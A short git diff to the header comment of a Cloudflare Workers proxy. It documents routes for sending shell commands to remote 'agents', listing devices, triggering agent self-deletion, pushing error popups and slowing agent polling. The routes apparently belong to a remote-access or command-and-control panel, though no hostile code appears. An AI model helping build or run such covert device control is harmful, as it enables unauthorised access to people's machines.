@@ -1,6 +1,24 @@
 /**
  * TELELLUC SITE WORKER - Cloudflare Workers Frontend Proxy
  *
+ * ROUTES EXPLAINED:
+ * =================
+ * POST /api/shell         → Send command to agent
+ * GET  /api/shell-result  → Fetch result from agent (with retries)
+ * GET  /api/devices       → List connected devices
+ * POST /api/rm            → Remove device
+ * POST /api/self-delete   → Trigger agent self-deletion
+ * POST /api/error         → Send error popup to device
+ * POST /api/slow-mode     → Reduce agent polling frequency
+ * POST /api/force-fast    → Resume normal polling
+ * POST /api/command-sync  → Synchronize command state
+ * POST /api/reset-id      → Reset device ID counter
+ *
+ * CRITICAL: This worker proxies between frontend (public) and backend (log-auth-worker)
+ * - Validates authentication via session cookie
+ * - Forwards requests to log-auth-worker
+ * - Does NOT modify payload (just proxies)
+ *
  * COMMIT GUIDELINES:
  * ==================
  * Format: git commit -m "vX.X.X
@@ -15,10 +33,6 @@
  *
  * DEPLOYMENT:
  * npx wrangler deploy
- *
- * VERSION INCREMENT:
- * Always increment vX.X.X when making changes and include in commit message
- * HTML changes should also increment the version
  */
 
 const SESSION_COOKIE = "session";
